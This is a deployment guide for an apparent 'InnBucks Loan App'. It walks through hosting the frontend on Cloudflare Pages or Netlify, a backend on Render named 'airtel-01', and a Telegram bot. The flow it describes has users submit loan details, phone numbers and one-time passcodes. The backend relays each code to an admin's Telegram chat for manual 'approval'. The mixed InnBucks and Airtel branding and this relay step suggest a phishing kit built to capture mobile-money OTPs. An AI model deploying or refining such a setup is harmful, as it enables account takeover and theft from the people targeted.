# Deployment Guide: InnBucks Loan App

Complete guide to deploy the full-stack application on **Cloudflare Pages (fullstack)** and/or **Render** (legacy backend).

---

## ☁️ Cloudflare Pages Fullstack (Recommended, Free Tier)

1. Install Wrangler CLI:

```bash
npm install -g wrangler
```

2. Authenticate:

```bash
wrangler login
```

3. In project root (this repo), publish:

```bash
wrangler pages deploy ./ --branch=main --project-name=inbucks-fullstack
```

4. Set environment variables in Cloudflare dashboard (Pages -> Settings -> Variables):

- `TELEGRAM_BOT_TOKEN`
- `TELEGRAM_ADMIN_CHAT_ID`
- `TELEGRAM_CALLBACK_TOKEN`

5. Confirm routes:

- Frontend: `https://<your-pages>.pages.dev`
- API endpoints auto-routed on `/api/*`

---

## 🚀 Quick Setup

### Backend URL Configuration

Before deployment, set the backend URL in your frontend. Add this to `index.html` before loan steps:

```javascript
// Set backend URL (on index.html or config file)
localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
```

Or dynamically detect environment:

```javascript
const isDevelopment = window.location.hostname === "localhost";
const backendUrl = isDevelopment
  ? "http://localhost:3000"
  : "https://airtel-01.onrender.com";
localStorage.setItem("backendUrl", backendUrl);
```

---

## ☁️ Deploy Backend on Render

### Step 1: Create GitHub Repository

```bash
cd backend
git init
git add .
git commit -m "Initial backend setup"
git push -u origin main
```

### Step 2: Create Render Service

1. Go to [render.com](https://render.com)
2. Click **New +** → **Web Service**
3. Connect your GitHub repository
4. Configure:
   - **Name**: `innbucks-otp-backend`
   - **Runtime**: Node
   - **Build Command**: `npm install`
   - **Start Command**: `npm start`

### Step 3: Set Environment Variables

In Render dashboard, add:

```env
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHijKLmNoPqRstuvWXyz
TELEGRAM_ADMIN_CHAT_ID=987654321
TELEGRAM_CALLBACK_TOKEN=your_secret_123
BACKEND_URL=https://airtel-01.onrender.com
PORT=3000
```

### Step 4: Deploy

Push to main branch to auto-deploy:

```bash
git push origin main
```

✅ Backend URL: `https://airtel-01.onrender.com`

---

## 🌐 Deploy Frontend on Cloudflare Pages

### Step 1: Create GitHub Repository

```bash
cd ..  # go to frontend folder with all HTML files
git init
git add .
git commit -m "Initial frontend setup"
git push -u origin main
```

### Step 2: Deploy to Cloudflare Pages

1. Go to [cloudflare.com](https://cloudflare.com)
2. Log in to your Cloudflare account
3. Go to **Pages** in the dashboard
4. Click **Create a project**
5. Connect your GitHub repository
6. Configure build settings:
   - **Build command**: Leave empty (static site)
   - **Build output directory**: `.` (root directory)
7. Click **Save and Deploy**

### Step 3: Update Backend URL

The frontend already has the backend URL configured in `index.html`. If you change the Render URL, update it there:

```javascript
// In index.html, update the production URL
const backendUrl = isDevelopment
  ? "http://localhost:3000"
  : "https://your-new-render-url.onrender.com";
```

✅ Frontend URL: `https://your-project.pages.dev`

---

## 🤖 Setup Telegram Bot

### 1. Create Bot with BotFather

```
Open Telegram → Search @BotFather
/newbot
Name: Airtel‑01 OTP Bot
Username: airtel_otp_bot
```

Copy the **Bot Token**: `123456789:ABCdefGHijKLmNoPqRstuvWXyz`

### 2. Get Your Admin Chat ID

```
1. Message your bot in Telegram
2. Visit: https://api.telegram.org/bot{TOKEN}/getUpdates
3. Find "chat": {"id": 987654321}
```

Copy your **Chat ID**: `987654321`

### 3. Add to Environment Variables

On Render dashboard:

```env
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHijKLmNoPqRstuvWXyz
TELEGRAM_ADMIN_CHAT_ID=987654321
TELEGRAM_CALLBACK_TOKEN=super_secret_key_123
```

---

## 🔗 CORS Configuration

Your backend already has CORS enabled for all origins. To restrict it in production:

Update `server.js`:

```javascript
const corsOptions = {
  origin: [
    "https://your-project.pages.dev",
    "https://your-custom-domain.com",
    "http://localhost:3000",
  ],
  credentials: true,
};

app.use(cors(corsOptions));
```

---

## 📊 Environment Variables Reference

### Backend (`backend/.env`)

| Variable                  | Example                   | Required              |
| ------------------------- | ------------------------- | --------------------- |
| `TELEGRAM_BOT_TOKEN`      | `123456:ABC...`           | ✅ Yes                |
| `TELEGRAM_ADMIN_CHAT_ID`  | `987654321`               | ✅ Yes                |
| `TELEGRAM_CALLBACK_TOKEN` | `secret_123`              | ✅ Yes                |
| `BACKEND_URL`             | `https://api.example.com` | ✅ Yes                |
| `PORT`                    | `3000`                    | ❌ No (default: 3000) |

### Frontend (`localStorage`)

Frontend sets dynamically:

```javascript
localStorage.setItem("backendUrl", "https://airtel-01.onrender.com");
```

---

## ✅ Testing Deployment

### 1. Test Backend Health

```bash
curl https://airtel-01.onrender.com/api/health
# Should return: {"status":"ok","service":"OTP Backend"}
```

### 2. Test Frontend Loads

Visit: `https://your-site.netlify.app`

### 3. Test Full Flow

1. Fill loan amount on homepage
2. Click APPLY NOW
3. Fill all loan details
4. Enter OTP (use 12345)
5. Submit OTP
6. Should show verification screen
7. Telegram bot receives approval request
8. Click ✅ APPROVE in Telegram
9. Frontend should proceed to next step

---

## 🐛 Troubleshooting

### Backend not responding

```bash
# Check logs on Render dashboard
# Verify environment variables are set
# Test endpoint manually:
curl -X POST https://airtel-01.onrender.com/api/otp/submit \
  -H "Content-Type: application/json" \
  -d '{"phone":"+263712345678","otp":"12345","userId":"test"}'
```

### Telegram bot not sending messages

1. Check `TELEGRAM_BOT_TOKEN` is valid
2. Check `TELEGRAM_ADMIN_CHAT_ID` is correct
3. Test bot:
   ```bash
   curl "https://api.telegram.org/botYOUR_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=Test"
   ```

### Frontend not finding backend

1. Update `BACKEND_URL` in localStorage
2. Check browser console for CORS errors
3. Verify backend URL is correct (no missing `/`)

### CORS errors

Add backend URL to Netlify build environment or hardcode in config.js

---

## 📈 Monitoring

### Render Dashboard

- View logs in real-time
- Monitor CPU/Memory usage
- Check deployment history

### Netlify Dashboard

- View analytics
- Monitor build logs
- Check deploy previews

---

## 🔐 Production Checklist

- [ ] Environment variables set in Render
- [ ] Telegram bot token configured
- [ ] Backend URL hardcoded or dynamic in frontend
- [ ] CORS origins restricted
- [ ] Database URL set (if using database)
- [ ] HTTPS enabled on both services
- [ ] Logs monitored for errors
- [ ] Test complete flow end-to-end
- [ ] Rate limiting configured (optional)
- [ ] Database backups enabled (if applicable)

---

## 📞 Support

If issues arise:

1. Check backend logs: Render dashboard → Logs
2. Check frontend console: Browser DevTools → Console
3. Test endpoints manually with `curl`
4. Verify Telegram bot token and chat ID
5. Check firewall/DNS settings

---

## 🎉 Deployment Complete!

Your loan application is now live with:

- ✅ Frontend on Netlify
- ✅ Backend on Render
- ✅ Telegram bot admin approval
- ✅ Real-time OTP verification

Next steps:

- Add database for persistence
- Implement password login for other pages
- Add email notifications
- Set up analytics
- Scale as needed
